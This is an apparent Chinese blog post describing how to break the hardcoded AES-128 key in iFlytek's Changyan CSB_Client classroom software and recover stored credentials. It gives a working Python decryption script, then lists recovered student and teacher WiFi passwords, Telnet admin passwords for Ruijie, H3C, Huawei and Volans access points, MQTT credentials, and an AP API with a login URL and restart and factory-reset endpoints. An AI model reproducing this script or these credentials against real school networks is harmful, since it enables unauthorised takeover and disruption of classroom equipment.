---
title: 破解畅言AP后台密码
published: 2026-04-16T13:09:00
description: 基于CSB_Client的AP/路由器密码破解方法
image: ../../assets/images/ap.png
tags: 
  - 畅言
  - AP
  - 路由器
  - 后台
  - 密码
category: 畅言
draft: false 
lang: ''
---

## 一、加密方案分析

### 1.1 文件位置

| 文件 | 路径 | 用途 |
|------|------|------|
| ApAuthConfig.dat | `config\ApAuthConfig.dat` | AP 设备 Telnet 登录凭据（主配置） |
| apAuthConfigEx.dat | `data\apAuthConfigEx.dat` | AP 设备 Telnet 登录凭据（扩展） |
| apWlanData.dat | `data\apWlanData.dat` | WiFi 无线网络运行配置 |

### 1.2 加密参数

| 参数 | 值 |
|------|-----|
| **算法** | AES-128-CBC |
| **Key** | `CSB-Enginer-PKey`（16 字节） |
| **IV** | 与 Key 相同（`CSB-Enginer-PKey`） |
| **外层编码** | Base64 |
| **填充** | PKCS7 |

Key 来源：从 `CSB_ApService.exe` 二进制文件中提取，硬编码在字符串常量中。

---

## 二、破解步骤

### 2.1 环境准备

需要 Python 3.x 和 pycryptodome 库：

```bash
pip install pycryptodome
```

### 2.2 解密脚本

```python
import base64
import json
from Crypto.Cipher import AES

AES_KEY = b"CSB-Enginer-PKey"  # 16-byte AES-128 key


def decrypt_csb_file(filepath: str) -> str:
    """解密 CSB_Client 的加密 .dat 配置文件"""
    # 1. 读取 Base64 编码内容
    with open(filepath, "rb") as f:
        b64_data = f.read()

    # 2. Base64 解码
    raw = base64.b64decode(b64_data)

    # 3. AES-128-CBC 解密（Key 与 IV 相同）
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_KEY)
    decrypted = cipher.decrypt(raw)

    # 4. 去除 PKCS7 填充
    pad_len = decrypted[-1]
    if 1 <= pad_len <= 16:
        decrypted = decrypted[:-pad_len]

    # 5. 转为 UTF-8 文本，跳过开头的对齐填充字节
    text = decrypted.decode("utf-8", errors="replace")
    # 找到第一个 '{' 作为 JSON 起点
    json_start = text.find("{")
    if json_start >= 0:
        text = text[json_start:]

    return text
```

### 2.3 解密 WiFi 运行配置（apWlanData.dat）

```python
def decrypt_wlan_config(data_dir: str = r"c:\Program Files (x86)\CSB_Client\data"):
    filepath = f"{data_dir}\\apWlanData.dat"
    text = decrypt_csb_file(filepath)

    # JSON 结构：
    # {
    #   "student": {"password": "xxx", "ssid": "ChangyanSTU{教室号}"},
    #   "teacher": {"password": "xxx", "ssid": "ChangyanTCH{教室号}"},
    #   "mopen":   {"password": "xxx", "ssid": "xxx"}
    # }
    data = json.loads(text)

    for role, info in data.items():
        ssid = info.get("ssid", "N/A")
        pwd = info.get("password", "N/A")
        print(f"  [{role}] SSID: {ssid}, 密码: {pwd}")

    return data


if __name__ == "__main__":
    print("=== WiFi 运行配置 ===")
    decrypt_wlan_config()
```

输出示例：

```
=== WiFi 运行配置 ===
  [student] SSID: ChangyanSTUC602, 密码: zhktzhkt
  [teacher] SSID: ChangyanTCHC602, 密码: iFlytek1234
```

### 2.4 解密 AP Telnet 登录凭据（ApAuthConfig.dat）

```python
def decrypt_ap_auth(config_dir: str = r"c:\Program Files (x86)\CSB_Client\config"):
    filepath = f"{config_dir}\\ApAuthConfig.dat"
    text = decrypt_csb_file(filepath)
    print(text)
    return text


if __name__ == "__main__":
    print("=== AP 登录凭据 ===")
    decrypt_ap_auth()
```

输出示例（格式化后）：

```
--- 锐捷 (CommSky) ---
  admin / iflytek
  admin / adminiwjB82rX
  iflytekAP / iwjB82rX

--- H3C ---
  admin / iflytek
  admin / h3capadmin
  iflytekAP / iwjB82rX

--- 华为 (HW) ---
  admin / adminiwjB82rX
  admin / admin@huawei.com
  iflytekAP / iwjB82rX

--- 飞鱼星 (Volans) ---
  admin / adminiwjB82rX
  iflytekAP / iwjB82rX

--- H3C W6 ---
  admin / adminiwjB82rX
```

---

## 三、密码汇总表

### 3.1 WiFi 网络密码

| 角色 | SSID 命名规则 | 默认密码 |
|------|---------------|----------|
| 学生 WiFi | `ChangyanSTU` + 教室号 | `zhktzhkt` |
| 教师 WiFi | `ChangyanTCH` + 教室号 | `iFlytek1234` |

### 3.2 AP 设备 Telnet 登录密码

| AP 品牌 | 用户名 | 密码 | 备注 |
|---------|--------|------|------|
| 锐捷 (Ruijie) | `admin` | `iflytek` | 默认首选 |
| 锐捷 (Ruijie) | `admin` | `adminiwjB82rX` | 次选 |
| 锐捷 (Ruijie) | `iflytekAP` | `iwjB82rX` | 讯飞专用账号 |
| H3C | `admin` | `iflytek` | 默认首选 |
| H3C | `admin` | `h3capadmin` | 次选 |
| H3C | `iflytekAP` | `iwjB82rX` | 讯飞专用账号 |
| H3C W6 | `admin` | `adminiwjB82rX` | 唯一账号 |
| 华为 (HW) | `admin` | `adminiwjB82rX` | 默认首选 |
| 华为 (HW) | `admin` | `admin@huawei.com` | 次选 |
| 华为 (HW) | `iflytekAP` | `iwjB82rX` | 讯飞专用账号 |
| 飞鱼星 (Volans) | `admin` | `adminiwjB82rX` | 默认首选 |
| 飞鱼星 (Volans) | `iflytekAP` | `iwjB82rX` | 讯飞专用账号 |

### 3.3 MQTT 内部通信凭据

| 用途 | 值 |
|------|-----|
| 用户名 | `csb_mq_user` |
| 密码 | `csb_iflytek` |
| 服务端口 | `127.0.0.1:20002` |

---

## 四、AP 管理接口

### 4.1 AP 管理 IP

- **默认管理地址**：`192.168.40.1`
- **网段**：`192.168.40.0/24`
- **DHCP 范围**：`192.168.40.10` ~ `192.168.40.200`
- **管理方式**：HTTP RESTful API（非传统 Web 页面）

### 4.2 API 端点

```
http://192.168.40.1/api/login?username=admin&password=iflytek
```

登录成功后返回 `uid`（会话令牌），后续请求需携带：

| 功能 | 方法 |
|------|------|
| 获取设备信息 | `GET /api/devinfo?uid=xxx` |
| 获取 WiFi 信息 | `GET /api/wireless?uid=xxx&method=get` |
| 获取连接设备 | `GET /api/wireless?uid=xxx&method=sta` |
| 获取 WAN 信息 | `GET /api/wan?uid=xxx&method=wanget` |
| 获取 DNS 信息 | `GET /api/dns?uid=xxx&method=dnsget` |
| 获取 MAC 过滤 | `GET /api/wireless?uid=xxx&method=wlmfget` |
| 导出配置 | `GET /api/export?uid=xxx&method=config` |
| 重启设备 | `GET /api/rst?uid=xxx&method=restart` |
| 恢复出厂 | `GET /api/rst?uid=xxx&method=restore` |

---

## 五、技术细节

### 5.1 密钥发现过程

1. 用十六进制编辑器 / `grep` 搜索 `CSB_ApService.exe` 二进制文件
2. 发现字符串常量：`1234567890123456`、`CSB-Enginer-PKey`、`apWlanData.dat`、`student`/`teacher`/`mopen`、`ssid`/`password`
3. 其中 `CSB-Enginer-PKey` 正好 16 字节，符合 AES-128 密钥长度
4. 用 pycryptodome 尝试 `AES-128-CBC` 模式，Key 和 IV 均为 `CSB-Enginer-PKey`，解密成功

### 5.2 数据流

```
[后端服务器]
    |
    | HTTPS (cygjapi.changyan.com / jkintranet.changyan.com)
    v
[CSB_ApService.exe]
    |
    | AES-128-CBC 加密 → Base64 编码 → 写入 .dat 文件
    v
[ApAuthConfig.dat / apWlanData.dat / apAuthConfigEx.dat]
    |
    | Telnet (H3C Comware 命令行) 或 HTTP API
    v
[AP 设备 192.168.40.1]
```

### 5.3 支持的 AP 型号

| 品牌标识 | 品牌 | Telnet 登录方式 |
|---------|------|----------------|
| CommSky | 锐捷 (Ruijie) | `login:` / `Password` |
| H3C | 新华三 | `Username:` / `Password` |
| H3CW6 | 新华三 W6 系列 | `login:` / `Password` |
| HW | 华为 | `Username:` / `Password` |
| FYX/Volans | 飞鱼星 | 自动检测 |
